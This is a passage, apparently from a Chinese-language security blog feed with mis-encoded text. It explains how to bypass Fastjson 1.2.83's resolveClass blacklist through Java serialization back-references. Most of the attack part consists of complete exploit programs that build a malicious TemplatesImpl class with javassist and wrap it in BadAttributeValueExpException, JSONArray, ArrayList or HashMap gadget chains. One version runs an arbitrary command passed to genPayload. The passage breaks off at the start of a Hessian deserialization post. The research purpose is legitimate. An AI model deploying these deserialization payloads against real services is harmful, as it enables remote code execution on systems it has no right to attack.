resolveClass<br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨çš„ååºåˆ—åŒ–å†™æ³•</strong></p><p>æˆ‘ä»¬æ­£å¸¸çš„å®‰å…¨ååºåˆ—åŒ–å†™æ³•åº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œç”Ÿæˆä¸€ä¸ªç»§æ‰¿ObjectInputStreamçš„ç±»å¹¶é‡å†™resolveClass(å‡å®šä¸ºTestInputStream)ï¼Œç”±å®ƒæ¥åšååºåˆ—åŒ–çš„å…¥å£ï¼Œè¿™æ ·æ‰æ˜¯å®‰å…¨çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TestInputStream -&gt; readObject -&gt; resolveClass<br></code></pre></td></tr></table></figure><p><strong>å¦‚ä½•ç»•è¿‡</strong></p><p>é‚£æˆ‘ä»¬çš„ç»•è¿‡æ€è·¯å°±æ˜¯å¦‚æœåœ¨ä¸­é—´çš„ç©ºæ¡£æœŸåšä¸€äº›æ‰‹è„šï¼Œè®©ä»–ä¸è¿›å…¥åˆ°resolveClassé‡Œé¢</p><p>å…³é”®åœ¨ObjectInputStream#readObject0é‡Œé¢ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410111558059.png" alt="image-20241011155830987"></p><p>ä»–ä¼šæ ¹æ®è¯»åˆ°çš„bytesä¸­tcçš„æ•°æ®ç±»å‹åšä¸åŒçš„å¤„ç†å»æ¢å¤éƒ¨åˆ†å¯¹è±¡</p><p>åœ¨ä¸åŒçš„caseä¸­ï¼Œå¤§éƒ¨åˆ†ç±»éƒ½ä¼šæœ€ç»ˆè°ƒç”¨<code>readClassDesc</code>å»è·å–ç±»çš„æè¿°ç¬¦ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¦‚æœå½“å‰ååºåˆ—åŒ–æ•°æ®ä¸‹ä¸€ä½ä»ç„¶æ˜¯<code>TC_CLASSDESC</code>é‚£ä¹ˆå°±ä¼šåœ¨<code>readNonProxyDesc</code>ä¸­è§¦å‘<code>resolveClass</code></p><p><img src="https://cdn.clown2024.cn/202410111611096.png" alt="image-20241011161140045"></p><p><img src="https://cdn.clown2024.cn/202410111611784.png" alt="image-20241011161152724"></p><p>ç„¶ååˆ†æ”¯ä¸­ï¼Œä¸ä¼šè°ƒç”¨<code>readClassDesc</code>çš„åˆ†æ”¯æœ‰<code>TC_NULL</code>ã€<code>TC_REFERENCE</code>ã€<code>TC_STRING</code>ã€<code>TC_LONGSTRING</code>ã€<code>TC_EXCEPTION</code>ï¼Œstringä¸nullè¿™ç§å¯¹æˆ‘ä»¬æ¯«æ— ç”¨å¤„çš„ï¼Œexceptionç±»å‹åˆ™æ˜¯è§£å†³åºåˆ—åŒ–ç»ˆæ­¢ç›¸å…³ä¹Ÿæ²¡ä»€ä¹ˆç”¨ï¼Œé‚£ä¹ˆå°±åªå‰©ä¸‹Referenceå¼•ç”¨ç±»å‹äº†ã€‚</p><h2 id="å¼•ç”¨ç±»å‹åˆ©ç”¨"><a href="#å¼•ç”¨ç±»å‹åˆ©ç”¨" class="headerlink" title="å¼•ç”¨ç±»å‹åˆ©ç”¨"></a>å¼•ç”¨ç±»å‹åˆ©ç”¨</h2><p>æˆ‘ä»¬éœ€è¦åœ¨JSONArray&#x2F;JSONObjectå¯¹è±¡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡æ—¶ï¼Œè®©æˆ‘ä»¬çš„æ¶æ„ç±»æˆä¸ºå¼•ç”¨ç±»å‹ä»è€Œç»•è¿‡resolveClassçš„æ£€æŸ¥</p><p>æ–¹æ³•å°±æ˜¯å‘Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶å³å¯æˆåŠŸåˆ©ç”¨</p><p><strong>åŸç†åˆ†æ</strong></p><p>åˆ†æä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å†™å…¥å¯¹è±¡çš„æ—¶å€™ä¼šèµ°åˆ°writeObject0è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410111631619.png" alt="image-20241011163106557"></p><p>è¿™é‡Œçš„æ³¨é‡Šç¿»è¯‘ä¸€ä¸‹å°±æ˜¯å¤„ç†ä»¥å‰å†™å…¥ä¸”ä¸å¯æ›¿æ¢çš„å¯¹è±¡</p><p>ç„¶åèµ°åˆ°ArrayList#writeObject</p><p><img src="https://cdn.clown2024.cn/202410111641589.png" alt="image-20241011164111537"></p><p>ç„¶åè·Ÿè¿›å»</p><p><img src="https://cdn.clown2024.cn/202410111641984.png" alt="image-20241011164143924"></p><p>è¿™æ¬¡ä¼ çš„æ˜¯TemplatesImplç±»ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡å†™çš„æ—¶å€™ä»–ä¼šåœ¨handleså“ˆå¸Œè¡¨ä¸­å»ºç«‹æ˜ å°„</p><p>å½“æˆ‘ä»¬å†æ¬¡å†™å…¥çš„æ—¶å€™ï¼Œä»–åœ¨æŸ¥è¯¢çš„æ—¶å€™å°±ä¸ä¼šè¿”å›-1</p><p><img src="https://cdn.clown2024.cn/202410111646059.png" alt="image-20241011164654999"></p><p>ç„¶åå°±å¯ä»¥è¿›å…¥åˆ°writeHandleæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410111647745.png" alt="image-20241011164743700"></p><p>å¯ä»¥çœ‹åˆ°ä»–å°†é‡å¤å¯¹è±¡ä»¥å¼•ç”¨ç±»å‹å†™å…¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡resolveClassçš„æ£€æŸ¥äº†</p><h2 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -1" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h2><p>æ–‡ç« çš„ç®€å•åˆ©ç”¨ä»£ç æ€è·¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl templates = TemplatesImplUtil.getEvilClass(&quot;clac&quot;);<br>ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();<br>arrayList.add(templates);<br><br>JSONArray jsonArray = new JSONArray();<br>jsonArray.add(templates);<br><br>BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);<br>arrayList.add(bd);<br>  <br>WriteObjects(arrayList);<br></code></pre></td></tr></table></figure><p>æ–‡ç« çš„æ€è·¯è§£é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">åºåˆ—åŒ–æ—¶ï¼Œåœ¨è¿™é‡Œtemplateså…ˆåŠ å…¥åˆ°arrayListä¸­ï¼Œåé¢åœ¨JSONArrayä¸­å†æ¬¡åºåˆ—åŒ–TemplatesImplæ—¶ï¼Œç”±äºåœ¨handlesè¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡º<br><br>ååºåˆ—åŒ–æ—¶ArrayListå…ˆé€šè¿‡readObjectæ¢å¤TemplatesImplå¯¹è±¡ï¼Œä¹‹åæ¢å¤BadAttributeValueExpExceptionå¯¹è±¡ï¼Œåœ¨æ¢å¤è¿‡ç¨‹ä¸­ï¼Œç”±äºBadAttributeValueExpExceptionè¦æ¢å¤valå¯¹åº”çš„JSONArray/JSONObjectå¯¹è±¡ï¼Œä¼šè§¦å‘JSONArray/JSONObjectçš„readObjectæ–¹æ³•ï¼Œå°†è¿™ä¸ªè¿‡ç¨‹å§”æ‰˜ç»™SecureObjectInputStreamï¼Œåœ¨æ¢å¤JSONArray/JSONObjectä¸­çš„TemplatesImplå¯¹è±¡æ—¶ï¼Œç”±äºæ­¤æ—¶çš„ç¬¬äºŒä¸ªTemplatesImplå¯¹è±¡æ˜¯å¼•ç”¨ç±»å‹ï¼Œé€šè¿‡readHandleæ¢å¤å¯¹è±¡çš„é€”ä¸­ä¸ä¼šè§¦å‘resolveClassï¼Œç”±æ­¤å®ç°äº†ç»•è¿‡<br><br>Setã€Mapç±»å‹ä¹Ÿæ˜¯è¿™æ ·çš„ç»•è¿‡<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±å¯ä»¥å†™expäº†ï¼Œæ”¹æˆfastjson1.2.83ç‰ˆæœ¬æ¥æ‰“</p><p>ArrayListçš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br><br>        arrayList.add(val);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111703825.png" alt="image-20241011170336723"></p><blockquote><p>è¿™é‡Œä¸€å¼€å§‹æˆ‘è‡ªå·±å†™ç›´æ¥ç®€å•ç²—æš´arrayliståŠ äº†ä¸¤æ¬¡ï¼Œç„¶åæŠŠarraylistæ”¾JSONArrayé‡Œï¼Œå¯¼è‡´æ‰“ä¸é€šï¼Œåæ¥ä¸€æƒ³éƒ½æ”¾é‡Œé¢çš„è¯æœ‰ä¸€ä¸ªä¼šä¸æ˜¯å¼•ç”¨ç±»å‹ï¼Œå¯¼è‡´ä»–ç»è¿‡resolveClassä¹‹åä¼šæå‰æŠ›å‡ºå¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— è®ºæ˜¯Listè¿˜æ˜¯Mapï¼Œéƒ½æ˜¯è¦åŒ…è£¹åœ¨å¤–é¢çš„ï¼Œä½¿å…¶ç¬¬ä¸€ä¸ªç±»ååºåˆ—åŒ–çš„æ—¶å€™ä¸ç»è¿‡resolveClass</p></blockquote><p>æ–‡ç« çš„HashMapçš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd,<span class="hljs-string">&quot;val&quot;</span>,jsonArray);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates,bd);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessianååºåˆ—åŒ–</title>
      <link href="/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>æ¥å­¦ä¸€ä¸‹Hessianååºåˆ—åŒ–ï¼Œä¸»è¦å‚è€ƒsu18å¸ˆå‚…çš„æ–‡ç« ï¼š</p><h1 id="hessianç®€ä»‹"><a href="#Hessianç®€ä»‹" class="headerlink" title="Hessianç®€ä»‹"></a>Hessianç®€ä»‹</h1><p>ç›´æ¥æŠ„su18å¸ˆå‚…é‡Œé¢çš„</p><p>Hessian æ˜¯ <a href="https://caucho.com/">caucho</a> å…¬å¸çš„å·¥ç¨‹é¡¹ç›®ï¼Œä¸ºäº†è¾¾åˆ°æˆ–è¶…è¿‡ ORMI&#x2F;Java JNI ç­‰å…¶ä»–è·¨è¯­è¨€&#x2F;å¹³å°è°ƒç”¨çš„èƒ½åŠ›è®¾è®¡è€Œå‡ºï¼Œåœ¨ 2004 ç‚¹å‘å¸ƒ 1.0 è§„èŒƒï¼Œä¸€èˆ¬ç§°ä¹‹ä¸º Hessian ï¼Œå¹¶é€æ­¥è¿­ä»£ï¼Œåœ¨ Hassian jar 3.2.0 ä¹‹åï¼Œé‡‡ç”¨äº†æ–°çš„ 2.0 ç‰ˆæœ¬çš„åè®®ï¼Œä¸€èˆ¬ç§°ä¹‹ä¸º Hessian 2.0ã€‚</p><p>è¿™æ˜¯ä¸€ç§åŠ¨æ€ç±»å‹çš„<a href="http://hessian.caucho.com/doc/hessian-serialization.html">äºŒè¿›åˆ¶åºåˆ—åŒ–</a>å’Œ <a href="http://hessian.caucho.com/doc/hessian-ws.html">Web æœåŠ¡</a>åè®®ï¼Œä¸“ä¸ºé¢å‘å¯¹è±¡çš„ä¼ è¾“è€Œè®¾è®¡ã€‚Hessian åè®®åœ¨è®¾è®¡æ—¶ï¼Œé‡ç‚¹çš„å‡ ä¸ªç›®æ ‡åŒ…æ‹¬äº†ï¼šå¿…é¡»å°½å¯èƒ½çš„å¿«ã€å¿…é¡»å°½å¯èƒ½ç´§å‡‘ã€è·¨è¯­è¨€ã€ä¸éœ€è¦å¤–éƒ¨æ¨¡å¼æˆ–æ¥å£å®šä¹‰ç­‰ç­‰ã€‚</p><p>å¯¹äºè¿™æ ·çš„è®¾è®¡ï¼Œcaucho å…¬å¸å…¶å®æä¾›äº†ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œä¸€ä¸ªæ˜¯ Hessianï¼Œä¸€ä¸ªæ˜¯ Burlapã€‚Hession æ˜¯åŸºäºäºŒè¿›åˆ¶çš„å®ç°ï¼Œä¼ è¾“æ•°æ®æ›´å°æ›´å¿«ï¼Œè€Œ Burlap çš„æ¶ˆæ¯æ˜¯ XML çš„ï¼Œæœ‰æ›´å¥½çš„å¯è¯»æ€§ã€‚ä¸¤ç§æ•°æ®éƒ½æ˜¯åŸºäº HTTP åè®®ä¼ è¾“ã€‚</p><p>Hessian æœ¬èº«ä½œä¸º <a href="https://caucho.com/products/resin">Resin</a> çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯å®ƒçš„ <code>com.caucho.hessian.client</code> å’Œ <code>com.caucho.hessian.server</code> åŒ…ä¸ä¾èµ–äºä»»ä½•å…¶ä»–çš„ Resin ç±»ï¼Œå› æ­¤å®ƒä¹Ÿå¯ä»¥ä½¿ç”¨ä»»ä½•å®¹å™¨å¦‚ Tomcat ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åœ¨ EJB ä¸­ã€‚äº‹å®ä¸Šå¾ˆå¤šé€šè®¯æ¡†æ¶éƒ½ä½¿ç”¨æˆ–æ”¯æŒäº†è¿™ä¸ªè§„èŒƒæ¥åºåˆ—åŒ–åŠååºåˆ—åŒ–ç±»ã€‚</p><p>ä½œä¸ºä¸€ä¸ªäºŒè¿›åˆ¶çš„åºåˆ—åŒ–åè®®ï¼ŒHessian è‡ªè¡Œå®šä¹‰äº†ä¸€å¥—è‡ªå·±çš„å‚¨å­˜å’Œè¿˜åŸæ•°æ®çš„æœºåˆ¶ã€‚å¯¹ 8 ç§åŸºç¡€æ•°æ®ç±»å‹ã€3 ç§é€’å½’ç±»å‹ã€ref å¼•ç”¨ä»¥åŠ Hessian 2.0 ä¸­çš„å†…éƒ¨å¼•ç”¨æ˜ å°„è¿›è¡Œäº†ç›¸å…³å®šä¹‰ã€‚è¿™æ ·çš„è®¾è®¡ä½¿å¾— Hassian å¯ä»¥è¿›è¡Œè·¨è¯­è¨€è·¨å¹³å°çš„è°ƒç”¨ã€‚</p><p>æœ‰å…³Hessianåè®®å’Œå…¶ä»–åè®®çš„å¯¹æ¯”ä»¥åŠååºåˆ—åŒ–åŸç†å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/ByteDanceTech/article/details/126188189">https://blog.csdn.net/ByteDanceTech/article/details/126188189</a></p><h1 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h1><p>su18å¸ˆå‚…çš„æ–‡ç« é‡Œé¢æä¾›äº†å¤šç§ä½¿ç”¨æ–¹å¼ï¼Œè¿™é‡Œæ¥å¤åˆ»ä¸€ä¸‹</p><h2 id="åŸºäºservlet"><a href="#åŸºäºServlet" class="headerlink" 